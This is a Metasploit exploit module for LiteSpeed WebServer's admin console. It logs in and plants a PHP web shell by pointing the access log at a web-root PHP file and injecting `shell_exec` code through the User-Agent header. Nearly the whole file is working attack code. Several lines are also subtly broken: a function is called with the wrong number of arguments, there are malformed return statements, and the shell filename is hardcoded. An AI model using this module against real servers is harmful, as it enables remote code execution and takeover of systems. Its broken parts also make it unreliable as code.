class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include Msf::Exploit::Remote::HttpClient
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'Vulnerable LiteSpeed Webserver Remote Code Execution',
            'Description' => %q{
                This module allows an attacker with a privileged admin account 
                to launch a reverse shell due to a command injection 
                vulnerability in Litespeed WebServer < 1.6.5. 
            },
            'License'       => MSF_LICENSE,
            'Author'        => [
                    'CmoS'# Author
                ],
            'References' => [
                    ['URL', 'https://www.exploit-db.com/exploits/49483'], 
                ],
            'Privileged' => false,
            'Payload' => {
                'Space' => 10000,
                'DisableNops' => true,
                'Compat' =>{
                'PayloadType' => 'cmd'
                }
            },
            'Platform' => 'unix',
            'Arch' => ARCH_CMD,
            'Targets' => [
                ['Vulnerable App', {}],
            ],
            'DisclosureDate' => "May 01 2020",
            'DefaultTarget'  => 0))
        
            register_options(
            [
                OptString.new('USERNAME', [true, "Litespeed username"]),
                OptString.new('PASSWORD', [true, "Litespeed password"])
            ])
        end

        def do_login(username, password)
            protocol  = ssl ? 'https' : 'https'
            print_status("1")
            peer      = "#{rhost}:#{rport}"
            res = send_request_cgi({
                'uri'     => normalize_uri(target_uri, 'login.php'),
                'version' => "1.1",
                'method' => "POST",
                'cookie' => '',
                'headers' => { 
                    'Referer' => "#{protocol}://#{peer}/login.php",
                    'Connection'=> "close",
                    'Content-Length'=> 37,
                    'Cache-Control'=> "max-age=0",
                    'Upgrade-Insecure-Requests'=> 1,
                    'Content-Type'=> "application/x-www-form-urlencoded",
                    'Sec-Fetch-Site'=> "same-origin",
                    'Sec-Fetch-Mode'=> "navigate",
                    'Sec-Fetch-User'=> "?1",
                    'Sec-Fetch-Dest'=> "document",
                    'Accept-Encoding'=> "gzip, deflate",
                    'Accept-Language'=> "en-US,en;q=0.9"
                },
                'vars_post' => {
                    'userid' => username,
                    'pass' => password
                }
            })
            if res && res.code == 302 && res.get_cookies =~ /lsws_uid=(\w+)/
                return res.get_cookies
            end
            return nil unless res
            ''
        end
        def get_tk_parram(cookie)
            protocol  = ssl ? 'https' : 'https'
            peer      = "#{rhost}:#{rport}"
            res = send_request_cgi({
                'uri'     => normalize_uri(target_uri, 'index.php'),
                'version' => "1.1",
                'method' => "GET",
                'cookie' => cookie,
                'headers' => { 
                    'Referer' => "#{protocol}://#{peer}/index.php",
                    'Connection'=> "close",
                    'Cache-Control'=> "max-age=0",
                    'Upgrade-Insecure-Requests'=> 1,
                    'Content-Type'=> "application/x-www-form-urlencoded",
                    'User-Agent'=> "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
                    'Sec-Fetch-Site'=> "same-origin",
                    'Sec-Fetch-Mode'=> "navigate",
                    'Sec-Fetch-User'=> "?1",
                    'Sec-Fetch-Dest'=> "document",
                    'Accept-Encoding'=> "gzip, deflate",
                    'Accept-Language'=> "en-US,en;q=0.9"
                }
            })
            if res && res.code == 200
                rs = res.body.match /(v\S+)=["']?((?:.(?!["']?\s+(?:\S+)=|[>"']))+.)["']?/
                return rs[2]
            end
            return nil unless res
            ''
    end

    def edit_access_log(cookie, tk)
        protocol  = ssl ? 'https' : 'https'
        peer      = "#{rhost}:#{rport}"
        res = send_request_cgi({
            'uri'     => normalize_uri(target_uri, 'config/confMgr.php'),
            'version' => "1.1",
            'method' => "POST",
            'cookie' => cookie,
            'headers' => { 
                'Referer' => "#{protocol}://#{peer}/config/confMgr.php?m=admin&p=general&t=VH_ACLOG&a=e&tk=#{tk}",
                'Content-Type'=> "application/x-www-form-urlencoded",
                'User-Agent'=> "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
            },
            'vars_post' => {
                'useServer' => 0,
                'fileName' => "/usr/local/lsws/admin/html/t5.php",
                'pipedLogger' => "",
                'logFormat' => "",
                'rollingSize' => "10M",
                'keepDays' => 90,
                'bytesLog' => "",
                'compressArchive' => "",
                'a'=> "s",
                'm' => "admin",
                'p' => "general",
                't' => "VH_ACLOG",
                'r' => "",
                'tk' => tk,
                'file_create' => ""
            }
        })
        if res && res.code == 200
            return res.body
        end
        return nil unless res ''
end

def restart_server(cookie, tk)
    protocol  = ssl ? 'https' : 'https'
    peer      = "#{rhost}:#{rport}"
    res = send_request_cgi({
        'uri'     => normalize_uri(target_uri, '/service/serviceMgr.php'),
        'version' => "1.1",
        'method' => "POST",
        'cookie' => cookie,
        'headers' => { 
            'Referer' => "#{protocol}://#{peer}/config/confMgr.php",
            'Content-Type'=> "application/x-www-form-urlencoded",
            'Sec-Fetch-Site'=> "same-origin",
            'Sec-Fetch-Mode'=> "navigate"
        },
        'vars_post' => {
            'act' => "restart",
            'actId' => "",
            'vl' => "",
            'tk' => tk,
        }
    })
    if res && res.code == 200
        return res.body
    end
    return nil unless res ''
end

def exploit
    cookie = do_login(datastore['USERNAME'], datastore['PASSWORD'])
    
    if cookie == '' || cookie.nil?
        fail_with(Failure::Unknown, 'Failed to retrieve session cookie')
    end
    print_status("Successfull get cookie: #{cookie}")
    
    tk = get_tk_parram(cookie)
    if tk == '' || tk.nil?
        fail_with(Failure::Unknown, 'Failed to retrieve tk parram!')
    end
    print_status("Successfull get tk parram: #{tk}")
    shell_name = Rex::Text.rand_text_alpha(10)
    print_status("Shell code upload to: #{shell_name}.php")
    edit_access_log(cookie, tk, shell_name)
    p = restart_server(cookie, tk)
    print_status("Waiting for server restart in 5s.")
    sleep(5)
    print_status("Successfull to restart server")
    protocol  = ssl ? 'https' : 'https'
    peer      = "#{rhost}:#{rport}"
    
    print_status("Use payload: #{payload.encoded}")
    print_status("Upload shell!")
    res = send_request_cgi({
        'uri'     => normalize_uri(target_uri, "/#{shell_name}.php"),
        'version' => "1.1",
        'method' => "GET",
        'headers' => { 
            'Referer' => "#{protocol}://#{peer}",
            'Content-Type'=> "application/x-www-form-urlencoded",
            'User-Agent'=> "<?php echo shell_exec(\"#{payload.encoded};\"); ?>",
            'Accept'=> "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"}
    })
    
    print_status("Start shelling!")
    res = send_request_cgi({
        'uri'     => normalize_uri(target_uri, "/#{shell_name}.php"),
        'version' => "1.1",
        'method' => "GET",
        'headers' => { 
            'Referer' => "#{protocol}://#{peer}",
            'Content-Type'=> "application/x-www-form-urlencoded",
            'User-Agent'=> "<?php echo shell_exec(\"#{payload.encoded};\"); ?>",
            'Accept'=> "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        }
    })
    end
end
 
